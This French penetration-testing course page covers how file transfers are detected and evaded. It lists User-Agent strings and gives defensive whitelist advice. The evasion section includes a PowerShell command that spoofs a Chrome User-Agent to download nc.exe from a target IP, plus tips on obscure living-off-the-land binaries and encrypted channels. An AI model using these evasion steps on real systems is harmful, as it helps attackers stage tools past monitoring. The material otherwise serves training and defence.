# Detection et evasion

## Pourquoi

Comprendre comment les transferts de fichiers sont detectes permet a la fois de mieux les realiser en pentest (evasion) et de mieux les identifier en defense (detection). Les deux faces de la meme piece : un pentester efficace sait ce que l'EDR voit, et un defenseur efficace sait ce que l'attaquant essaie de cacher.

## Comment ca marche

### Detection cote reseau

La majorite des protocoles client-serveur incluent un **User-Agent** dans leurs echanges. Cette chaine identifie le logiciel qui effectue la requete. Les outils de transfert courants (PowerShell, certutil, curl, wget) envoient des User-Agents reconnaissables qui permettent aux equipes de securite de les identifier dans les logs reseau.

| Outil | User-Agent |
|---|---|
| `Invoke-WebRequest` | `Mozilla/5.0 (...) WindowsPowerShell/5.1.x` |
| `WinHttp.WinHttpRequest.5.1` | `Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)` |
| `Msxml2.XMLHTTP` | `Mozilla/4.0 (compatible; MSIE 7.0; ...)` |
| `certutil` | `Microsoft-CryptoAPI/10.0` |
| `bitsadmin` / BITS | `Microsoft BITS/7.8` |

### Detection cote endpoint

Les equipes de securite peuvent surveiller les lignes de commande executees sur les postes via Sysmon, PowerShell ScriptBlock Logging ou un EDR. Une approche par **liste blanche** des commandes habituelles permet de reperer les usages anormaux.

{% hint style="info" %}
La detection par liste noire (blacklisting) de commandes specifiques est facile a contourner avec des variations de casse (`CERTUTIL`, `CertUtil`, `certutil`). L'approche par liste blanche est plus robuste.
{% endhint %}

### Approche de detection recommandee

1. Etablir une liste blanche des User-Agents legitimes dans l'environnement (navigateurs, services systeme, outils de mise a jour).
2. Filtrer ces User-Agents dans un SIEM pour isoler les chaines inconnues ou suspectes.
3. Croiser avec les logs endpoint (processus, lignes de commande) pour confirmer l'activite suspecte.

## En pratique : techniques d'evasion

### Modification du User-Agent (PowerShell)

PowerShell permet de changer le User-Agent envoye avec `Invoke-WebRequest`.

**Lister les User-Agents disponibles :**

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name, @{
    label="User Agent"
    Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}
} | fl
```

**Utiliser un User-Agent Chrome :**

```powershell
$ua = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://<IP_CIBLE>/nc.exe -UserAgent $ua -OutFile "C:\Users\Public\nc.exe"
```

Cote serveur, la requete apparait comme provenant de Chrome, pas de PowerShell.

### Utilisation de binaires LOL

Quand PowerShell est surveille ou bloque, les binaires systeme (LOLBAS/GTFOBins) offrent une alternative. Certains sont rarement surveilles car leur usage pour du transfert de fichiers n'est pas connu de tous les defenseurs.

{% hint style="success" %}
Les binaires LOL les moins connus (GfxDownloadWrapper, desktopimgdownldr) sont moins susceptibles d'etre dans les regles de detection. Explorer regulierement les projets LOLBAS et GTFOBins pour decouvrir de nouvelles options.
{% endhint %}

### Chiffrement du canal

Utiliser HTTPS ou un canal SSL (OpenSSL, Ncat avec `--ssl`) empeche l'inspection du contenu par un IDS/IPS. Le trafic chiffre ne revele pas le contenu du fichier transfere ni les commandes executees.

## Pieges et galeres

- Changer le User-Agent ne suffit pas si l'EDR surveille les processus. PowerShell qui telecharge un fichier reste PowerShell, quel que soit le User-Agent.
- Les proxys d'entreprise peuvent inspecter le trafic HTTPS (interception SSL). Dans ce cas, le chiffrement du canal ne protege pas contre l'inspection.
- Certains EDR correlent les evenements reseau et endpoint. Un processus `certutil` qui fait une requete HTTP sortante sera detecte meme si le User-Agent est modifie.
- L'evasion n'est pas de l'invisibilite. Toute action laisse des traces quelque part (logs systeme, journaux reseau, evenements Windows). L'objectif est de reduire la probabilite de detection, pas de l'eliminer.

## Retour terrain

En mission, l'evasion de la detection depend enormement du niveau de maturite de la cible. Face a un SOC avec un EDR correctement configure, les methodes classiques (certutil, PowerShell WebClient) sont detectees en quelques minutes. Face a un environnement moins surveille, elles passent sans probleme. L'important est de commencer par les methodes les plus discretes et de monter en agressivite si necessaire, pas l'inverse.

## Memo express

| Technique | Objectif |
|---|---|
| Modifier le User-Agent | Passer pour un navigateur legitime |
| Utiliser des binaires LOL peu connus | Eviter les regles de detection classiques |
| Canal chiffre (HTTPS, SSL) | Empecher l'inspection du contenu en transit |
| Liste blanche de User-Agents (defense) | Detecter les outils anormaux dans les logs |
| Correlation endpoint + reseau (defense) | Identifier les processus suspects qui font du transfert |

***
